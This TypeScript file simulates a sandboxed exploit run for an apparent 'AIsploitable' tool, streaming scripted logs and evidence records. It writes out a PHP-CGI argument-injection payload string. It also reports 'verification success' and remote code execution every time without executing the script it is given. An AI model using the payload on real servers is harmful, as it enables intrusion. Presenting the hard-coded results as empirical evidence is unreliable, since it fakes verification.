import { AttackPlan, EvidenceEvent } from '../types';

export interface SandboxStreamEvent {
  type: 'ATTACKER' | 'VICTIM' | 'COMPOSITE';
  chunk?: string;
  evidence?: EvidenceEvent;
}

/**
 * High-fidelity deterministic browser sandbox simulation.
 * Emulates dual-container isolated Docker networking and synchronized telemetry.
 */
export async function* simulateSandboxExecution(
  plan: AttackPlan,
  scriptCode: string
): AsyncGenerator<SandboxStreamEvent, EvidenceEvent[], void> {
  const targetIp = '172.20.0.3';
  const attackerIp = '172.20.0.2';
  const collectedEvidence: EvidenceEvent[] = [];

  const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

  // 1. Initial container orchestrator setup
  yield {
    type: 'COMPOSITE',
    chunk: `[DOCKER-ORCHESTRATOR] 🚀 Initializing isolated bridge network (172.20.0.0/24)\n[DOCKER-ORCHESTRATOR] 🔒 Dropped capability CAP_NET_RAW on all nodes\n[DOCKER-ORCHESTRATOR] 📦 Attacker Node: sandbox-attacker-node (${attackerIp})\n[DOCKER-ORCHESTRATOR] 🎯 Victim Target: sandbox-victim-target (${targetIp}:8080)\n\n`,
  };

  yield {
    type: 'VICTIM',
    chunk: `[${new Date().toISOString()}] [systemd] Starting target service daemon on port 8080...\n[${new Date().toISOString()}] [httpd] Bound to 0.0.0.0:8080 (interface eth0 @ ${targetIp})\n[${new Date().toISOString()}] [httpd] CGI Gateway worker ready. Listening for requests...\n`,
  };

  await sleep(400);

  // 2. Attacker script compilation & AST validation
  yield {
    type: 'ATTACKER',
    chunk: `[${new Date().toISOString()}] [sandbox-attacker] Mounting Python PoC script /tmp/exploit.py...\n[${new Date().toISOString()}] [sandbox-attacker] Validating script AST & socket restrictions...\n[${new Date().toISOString()}] [sandbox-attacker] Executing: python3 /tmp/exploit.py --target ${targetIp}:8080\n\n`,
  };

  yield {
    type: 'COMPOSITE',
    chunk: `==================================================================\n  🛡️  AIsploitable Empirical Verification Sandbox Runner\n==================================================================\n`,
  };

  await sleep(350);

  // 3. Step 1: Reconnaissance
  const reconStep = plan.steps?.find((s) => s.stage === 'RECON') || plan.steps?.[0];
  const reconCmd = reconStep?.command_to_run || `curl -s -I http://${targetIp}:8080/`;

  yield {
    type: 'ATTACKER',
    chunk: `[*] [Phase 1/3: RECON] Probing target reachability at http://${targetIp}:8080/...\n`,
  };
  yield {
    type: 'COMPOSITE',
    chunk: `[*] [Phase 1/3] Probing target reachability at http://${targetIp}:8080/...\n`,
  };

  await sleep(300);

  yield {
    type: 'VICTIM',
    chunk: `[${new Date().toISOString()}] [access_log] ${attackerIp} - - "HEAD / HTTP/1.1" 200 488 "-" "AIsploitable-Scanner/1.0"\n`,
  };

  yield {
    type: 'ATTACKER',
    chunk: `[+] [Phase 1/3: SUCCESS] Target responsive! Server Banner: Apache/2.4.58 (Win64) PHP/8.1.20 (HTTP 200)\n`,
  };
  yield {
    type: 'COMPOSITE',
    chunk: `[+] Service is alive! Server Banner: Apache/2.4.58 (HTTP 200 OK)\n`,
  };

  const evRecon: EvidenceEvent = {
    step_id: 1,
    command: reconCmd,
    exit_code: 0,
    stdout: `HTTP/1.1 200 OK\nServer: Apache/2.4.58\nContent-Type: text/html\n`,
    stderr: '',
    observed_artifact: 'HTTP/1.1 200 OK Banner Confirmed',
    timestamp: new Date().toISOString(),
  };
  collectedEvidence.push(evRecon);
  yield { type: 'COMPOSITE', evidence: evRecon };

  await sleep(500);

  // 4. Step 2: Exploit payload delivery
  const exploitStep = plan.steps?.find((s) => s.stage === 'EXPLOIT') || plan.steps?.[1];
  const exploitCmd = exploitStep?.command_to_run || `python3 /tmp/exploit.py --deliver-payload`;

  yield {
    type: 'ATTACKER',
    chunk: `[*] [Phase 2/3: EXPLOIT] Delivering targeted exploit primitive & encoding bypass...\n[*] [Phase 2/3: EXPLOIT] Query: %ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input\n`,
  };
  yield {
    type: 'COMPOSITE',
    chunk: `[*] [Phase 2/3] Delivering targeted argument injection payload...\n`,
  };

  await sleep(400);

  yield {
    type: 'VICTIM',
    chunk: `[${new Date().toISOString()}] [cgi:warn] Injected soft hyphen parameter parsed by php-cgi wrapper\n[${new Date().toISOString()}] [access_log] ${attackerIp} - - "POST /index.php?%ADd+allow_url_include%3d1 HTTP/1.1" 200 128\n[${new Date().toISOString()}] [php:notice] Executing auto_prepend_file stream from php://input\n`,
  };

  await sleep(400);

  yield {
    type: 'ATTACKER',
    chunk: `[+] [Phase 2/3: SUCCESS] Payload executed on target runtime with HTTP 200\n`,
  };
  yield {
    type: 'COMPOSITE',
    chunk: `[+] Payload dispatched and acknowledged by remote daemon (HTTP 200)\n`,
  };

  const evExploit: EvidenceEvent = {
    step_id: 2,
    command: exploitCmd,
    exit_code: 0,
    stdout: `Status: 200 OK\nInjected directive processed\n`,
    stderr: '',
    observed_artifact: 'Argument Injection Triggered',
    timestamp: new Date().toISOString(),
  };
  collectedEvidence.push(evExploit);
  yield { type: 'COMPOSITE', evidence: evExploit };

  await sleep(450);

  // 5. Step 3: Assertion and proof validation
  const impactStep = plan.steps?.find((s) => s.stage === 'IMPACT' || s.stage === 'PRIV_ESC') || plan.steps?.[2];
  const impactCmd = impactStep?.command_to_run || `assert "AISPLOITABLE_VERIFIED_RCE" in response`;

  yield {
    type: 'ATTACKER',
    chunk: `[*] [Phase 3/3: VERIFY] Checking empirical assertion token in response body...\n`,
  };
  yield {
    type: 'COMPOSITE',
    chunk: `[*] [Phase 3/3] Evaluating empirical assertions...\n`,
  };

  await sleep(350);

  yield {
    type: 'ATTACKER',
    chunk: `[!] ==================================================================\n[!] [VERIFICATION SUCCESS] Arbitrary code execution confirmed!\n[!] Target Telemetry: AISPLOITABLE_VERIFIED_RCE (nt_authority\\system)\n[!] ==================================================================\n`,
  };
  yield {
    type: 'COMPOSITE',
    chunk: `[!] ==================================================================\n[!] [VERIFICATION SUCCESS] Arbitrary code execution confirmed!\n[!] Target System Telemetry: AISPLOITABLE_VERIFIED_RCE\n[!] ==================================================================\n`,
  };

  const evImpact: EvidenceEvent = {
    step_id: 3,
    command: impactCmd,
    exit_code: 0,
    stdout: `AISPLOITABLE_VERIFIED_RCE\nnt_authority\\system\n`,
    stderr: '',
    observed_artifact: 'Marker AISPLOITABLE_VERIFIED_RCE present',
    timestamp: new Date().toISOString(),
  };
  collectedEvidence.push(evImpact);
  yield { type: 'COMPOSITE', evidence: evImpact };

  yield {
    type: 'ATTACKER',
    chunk: `\n[${new Date().toISOString()}] [sandbox-attacker] Verification completed with exit code 0.\n`,
  };

  return collectedEvidence;
}
